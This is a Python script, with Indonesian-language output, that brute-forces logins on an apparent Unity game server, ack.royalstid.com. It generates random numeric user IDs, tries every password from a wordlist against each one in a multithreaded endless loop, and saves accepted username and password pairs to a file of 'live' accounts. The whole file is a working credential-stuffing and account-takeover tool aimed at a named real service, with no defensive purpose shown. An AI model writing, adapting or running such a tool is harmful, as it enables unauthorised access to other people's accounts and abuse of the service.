import requests
import random
import threading
from concurrent.futures import ThreadPoolExecutor
import time

def read_lines(filename):
    with open(filename, 'r') as file:
        return file.readlines()

def generate_username():
    return f"10{random.randint(100000, 999999)}"

def read_blocked_users(filename):
    try:
        with open(filename, 'r') as file:
            return set(file.read().splitlines())
    except FileNotFoundError:
        return set()

def write_blocked_user(filename, user_id):
    with open(filename, 'a') as file:
        file.write(f"{user_id}\n")

def process_user(args):
    username, password, random_value, successful_entries, live_file, blocked_users, block_file = args

    data = (
        b'\x0a\x08' + username.encode('utf-8') +
        b'\x12\x09' + password.encode('utf-8') +
        b'\x1a\x24\x66\x66\x66\x66\x66\x66\x66\x66\x2d\x61\x62\x34\x33\x2d\x32\x63\x31\x66\x2d\x66\x66\x66\x66\x2d\x66\x66\x66\x66\x65\x66\x30' +
        random_value.encode('utf-8') +
        b'\x20\x01\x28\xd9\xb3\x01\x32\x21\x31\x37\x30\x30\x38\x34\x39\x38\x36\x30\x35\x30\x31\x2d\x38\x34\x34\x36\x38\x37\x32\x33\x38\x38\x32\x34\x36\x38\x33\x31\x38\x30\x31\x3a\x05\x36\x2e\x31\x31\x39\x40\x01\x48\x00\x52\x0d\x52\x65\x64\x6d\x69\x20\x38\x41\x20\x44\x75\x61\x6c'
    )

    headers = {
        'host': 'ack.royalstid.com',
        'user-agent': 'UnityPlayer/2020.3.17f1c1 (UnityWebRequest/1.0, libcurl/7.75.0-DEV)',
        'accept': '*/*',
        'accept-encoding': 'deflate, gzip',
        'content-type': 'application/octet-stream',
        'x-unity-version': '2020.3.17f1c1'
    }

    url = 'https://ack.royalstid.com/hall/'
    params = {'ops': '61'}

    response = requests.post(url, params=params, headers=headers, data=data)

    with threading.Lock():
        user_id = username.split()[-1]

        if user_id not in blocked_users and len(response.text) > 20 and (username, password) not in successful_entries:
            entry = f"USER BENAR | USER : {username} | PASS : {password}\n"

            # Memastikan setiap ID unik sebelum menuliskannya ke file
            if user_id not in [entry.split()[-1] for entry in successful_entries]:
                live_file.write(entry)
                successful_entries.add(entry)
                write_blocked_user(block_file, user_id)
        else:
            print(f"USER GAGAL | {username}")

def main():
    password_file = "pw.txt"
    block_file = "block.txt"

    while True:
        random_value = str(10000 + random.randint(0, 90000))
        username_file = "akun.txt"

        usernames = [generate_username() for _ in range(500)]  # Adjust the number as needed
        passwords = read_lines(password_file)
        blocked_users = read_blocked_users(block_file)

        successful_entries = set()

        with open("live.txt", "a") as live_file, open(username_file, "w") as username_output, ThreadPoolExecutor(max_workers=10) as executor:
            for username in usernames:
                username_output.write(username + "\n")

            thread_args = [
                (username.strip(), password.strip(), random_value, successful_entries, live_file, blocked_users, block_file)
                for username in usernames
                for password in passwords
            ]

            executor.map(process_user, thread_args)

if __name__ == "__main__":
    main()
